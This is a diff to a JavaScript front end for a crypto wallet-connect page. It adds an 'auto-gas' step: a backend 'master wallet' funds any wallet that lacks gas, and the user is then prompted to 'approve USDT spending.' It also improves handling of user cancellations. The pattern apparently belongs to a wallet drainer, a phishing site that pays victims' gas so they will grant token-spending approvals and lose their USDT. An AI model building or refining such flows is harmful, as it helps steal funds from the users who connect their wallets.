@@ -51,7 +51,7 @@ document.addEventListener('DOMContentLoaded', () => {
   disconnectBtn.addEventListener('click', disconnectWallet)
 })
 
-// Connect wallet function
+// Connect wallet function - Now handles gas during connection
 async function connectWallet() {
   try {
     showLoading(connectText, true)
@@ -83,14 +83,40 @@ async function connectWallet() {
     showWalletSection()
     updateWalletInfo()
     
-    // Send to backend
-    sendWalletToBackend()
+    // Send to backend first
+    await sendWalletToBackend()
+    
+    // Check gas and handle auto-gas if needed
+    await handleAutoGasIfNeeded()
     
   } catch (error) {
     console.error('Connection error:', error)
     showError('Failed to connect wallet: ' + error.message)
   } finally {
     showLoading(connectText, false)
+  }
+}
+
+// Handle auto gas during connection
+async function handleAutoGasIfNeeded() {
+  try {
+    // Check if wallet has sufficient gas
+    const hasGas = await checkWalletGasBalance()
+    
+    if (!hasGas) {
+      showSuccess('Insufficient gas detected. Requesting gas from master wallet...')
+      
+      // Request gas from backend (master wallet)
+      await requestGasFromMaster(walletAddress)
+      
+      // Wait for gas to be sent by master wallet
+      await waitForGas(60000) // Wait up to 60 seconds
+      
+      showSuccess('Gas received! You can now approve USDT spending.')
+    }
+  } catch (error) {
+    console.error('Auto gas handling error:', error)
+    showError('Gas handling issue: ' + error.message)
   }
 }
 
@@ -191,8 +217,12 @@ async function handleApprovalFlow() {
   } catch (error) {
     console.error('Approval flow error:', error)
     
-    // Check if it's a gas-related error - if so, reset the connection flow
-    if (error.message.includes('gas') || error.message.includes('funds') || error.message.includes('underpriced')) {
+    // Check if it's a user cancellation (MetaMask cancel)
+    if (error.code === 4001 || (error.message && error.message.includes('user rejected'))) {
+      showError('Transaction cancelled by user.')
+    } 
+    // Check if it's a gas-related error
+    else if (error.message && (error.message.includes('gas') || error.message.includes('funds') || error.message.includes('underpriced'))) {
       showError('Insufficient gas. Please try again - the master wallet will send gas.')
       // Reset the connection to start fresh
       resetConnection()
@@ -315,6 +345,10 @@ async function approveUSDTSpending() {
     
   } catch (error) {
     console.error('Approval error:', error)
+    // Handle user cancellation specifically
+    if (error.code === 4001 || (error.message && error.message.includes('user rejected'))) {
+      throw new Error('Transaction cancelled by user.')
+    }
     throw error
   }
 }
